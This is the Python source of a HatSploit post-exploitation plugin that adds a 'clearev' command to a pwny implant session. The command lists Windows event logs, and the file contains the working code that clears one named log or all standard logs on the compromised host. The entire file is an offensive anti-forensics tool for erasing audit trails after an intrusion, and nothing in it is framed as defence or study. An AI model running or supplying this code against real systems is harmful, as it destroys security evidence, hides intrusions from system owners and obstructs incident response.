"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from badges.cmd import Command

from pwny.api import *
from pwny.types import *

from hatsploit.lib.core.plugin import Plugin


EVENTLOG_CLEAR = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL)
EVENTLOG_LIST = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 1)

TLV_TYPE_EVTLOG_NAME = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
TLV_TYPE_EVTLOG_COUNT = tlv_custom_type(TLV_TYPE_INT, TAB_BASE, API_TYPE)


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__({
            'Name': "Event Log Plugin",
            'Plugin': "eventlog",
            'Authors': [
                'EntySec - plugin developer',
            ],
            'Description': "Clear Windows event logs.",
        })

        self.commands = [
            Command({
                'Category': "manage",
                'Name': "clearev",
                'Description': "Clear Windows event logs.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('-l', '--list'),
                        {
                            'help': "List event logs and record counts.",
                            'action': 'store_true',
                        }
                    ),
                    (
                        ('-c', '--clear'),
                        {
                            'help': "Clear a specific event log by name.",
                            'metavar': 'NAME',
                        }
                    ),
                    (
                        ('-a', '--all'),
                        {
                            'help': "Clear all standard event logs.",
                            'action': 'store_true',
                        }
                    ),
                ]
            })
        ]

    def clearev(self, args):
        if args.list:
            result = self.session.send_command(
                tag=EVENTLOG_LIST, plugin=self.plugin
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Failed to list event logs!")
                return

            data = []
            name_raw = result.get_raw(TLV_TYPE_EVTLOG_NAME)

            while name_raw:
                name = name_raw.decode('utf-8', errors='replace')
                count = result.get_int(TLV_TYPE_EVTLOG_COUNT) or 0
                data.append((name, str(count)))
                name_raw = result.get_raw(TLV_TYPE_EVTLOG_NAME)

            if not data:
                self.print_warning("No event logs found.")
                return

            self.print_table("Event Logs", ('Name', 'Records'), *data)

        elif args.clear:
            self.print_process(f"Clearing event log: {args.clear}...")

            result = self.session.send_command(
                tag=EVENTLOG_CLEAR,
                plugin=self.plugin,
                args={
                    TLV_TYPE_EVTLOG_NAME: args.clear,
                }
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error(f"Failed to clear event log: {args.clear}")
                self.print_information("May require administrator/SYSTEM privileges.")
                return

            self.print_success(f"Event log '{args.clear}' cleared.")

        elif args.all:
            self.print_process("Clearing all standard event logs...")

            result = self.session.send_command(
                tag=EVENTLOG_CLEAR, plugin=self.plugin
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Failed to clear some event logs!")
                self.print_information("May require administrator/SYSTEM privileges.")
                return

            self.print_success("All standard event logs cleared.")

        else:
            self.print_usage()

    def load(self):
        pass
